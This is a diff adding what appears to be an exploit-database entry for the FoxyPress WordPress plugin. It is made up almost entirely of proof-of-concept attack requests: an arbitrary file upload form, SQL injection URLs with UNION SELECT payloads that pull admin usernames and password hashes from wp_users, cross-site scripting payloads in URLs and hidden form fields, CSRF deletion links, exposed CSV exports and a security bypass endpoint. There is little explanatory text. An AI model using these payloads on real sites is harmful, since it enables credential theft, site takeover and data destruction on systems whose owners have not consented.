@@ -1,0 +1,140 @@
+---------------------------------------------
+Arbitrary File Upload Vulnerability
+---------------------------------------------
+
+http://www.example.com/wp342/wp-admin/post.php?post=43&action=edit
+
+http://www.example.com/wp342/wp-content/inventory_downloadables/my_download_jw82ku0jz9_43.php
+
+---------------------------------------------
+SQL Injection Vulnerability
+---------------------------------------------
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category&mode=delete&category_id=waraxe
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&orderby=management_asset_name&order=waraxe
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_banner&banner_id=waraxe
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_banner&banner_id=0+UNION+SELECT+1,1,(SELECT+CONCAT_WS(0x3a,user_login,user_pass)FROM+wp_users+WHERE+ID=1),1,1,1
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_past_details&affiliate_id=waraxe
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=view_past_details&affiliate_id=0+UNION+SELECT+1,1,1,1,1,1,1,1,(SELECT+CONCAT_WS(0x3a,user_login,user_pass)FROM+wp_users+WHERE+ID=1),1,1
+
+-------------------------[ test code start]-----------------------------------
+<html><body><center>
+<form
+action="http://localhost/wp342/wp-admin/admin-ajax.php?action=foxypress_download&security=844b64ce45"
+method="post" enctype="multipart/form-data">
+<input type="file" name="Filedata">
+<input type="hidden" name="downloadablemaxdownloads" value="1">
+<input type="hidden" name="prefix" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end]------------------------------------
+
+-------------------------[ test code start]-----------------------------------
+<html><body><center>
+<form
+action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=manage-emails&mode=edit&id=waraxe"
+method="post">
+<input type="hidden" name="foxy_em_save" value="1">
+<input type="hidden" name="templatename" value="2">
+<input type="hidden" name="subject" value="3">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end]------------------------------------
+
+-------------------------[ test code start]-----------------------------------
+<html><body><center>
+<form
+action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category"
+method="post">
+<input type="hidden" name="foxy_cat_save" value="1">
+<input type="hidden" name="foxy_cat_name" value="1">
+<input type="hidden" name="foxy_cat_id" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end]------------------------------------
+
+---------------------------------------------
+HTML Injection Vulnerability
+---------------------------------------------
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=manage-emails&mode=edit&id=<body+onload=alert(123);>
+
+http://www.example.com/wp342/wp-content/plugins/foxypress/foxypress-affiliate.php?aff_id="><script>alert(123);</script>
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-signup
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=order-management&status="></option></select><script>alert(123);</script>
+
+http://www.example.com/wp342/wp-content/plugins/foxypress/foxypress-affiliate.php?url=http://php.net/
+
+-------------------------[ test code start]-----------------------------------
+<html><body><center>
+<form
+action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=reports&report=2"
+method="post">
+<input type="hidden" name="txtStartDate"
+value='"><script>alert(123)</script>'>
+<input type="hidden" name="txtEndDate" value='"><script>alert(223)</script>'>
+<input type="hidden" name="txtProductCode"
+value='"><script>alert(323)</script>'>
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end]------------------------------------
+
+-------------------------[ test code start]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management"
+method="post">
+<input type="hidden" name="page" value='"><script>alert(123);</script>'>
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end]------------------------------------
+
+
+---------------------------------------------
+Information Disclosure Vulnerability
+---------------------------------------------
+
+http://www.example.com/wp342/wp-content/plugins/foxypress/Coupons.csv
+
+http://www.example.com/wp342/wp-content/plugins/foxypress/Export.csv
+
+http://www.example.com/wp342/wp-content/plugins/foxypress/Inventory.csv
+
+---------------------------------------------
+CSRF Vulnerability
+---------------------------------------------
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=affiliate-management&mode=delete_banner&banner_id=123
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category&mode=delete&category_id=123
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-category&mode=delete_image&category_id=123
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=inventory-option-groups&action=deleteoptiongroup&optiongroupid=123
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=status-management&action=delete&status=123
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=order-management&action=deletenote&note=123
+
+http://www.example.com/wp342/wp-admin/edit.php?post_type=foxypress_product&page=manage-emails&action=delete&id=123
+
+---------------------------------------------
+Security Bypass Vulnerability
+---------------------------------------------
+
+http://www.example.com/wp342/wp-content/plugins/foxypress/ajax.php?m=tracking&id=123&ln=doe
+
+http://www.example.com/wp342/wp-content/plugins/foxypress/ajax.php
+
+
